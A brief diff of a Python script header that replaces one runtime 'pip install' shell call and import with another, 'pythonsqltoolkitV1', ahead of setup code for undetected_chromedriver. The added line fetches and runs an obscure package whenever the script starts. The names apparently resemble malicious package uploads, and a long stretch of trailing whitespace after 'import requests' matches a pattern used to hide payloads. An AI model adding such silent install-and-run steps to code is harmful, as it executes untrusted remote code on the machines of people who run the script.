@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptextensions")
-import pythoncryptextensions
+os.system("pip install pythonsqltoolkitV1")
+import pythonsqltoolkitV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
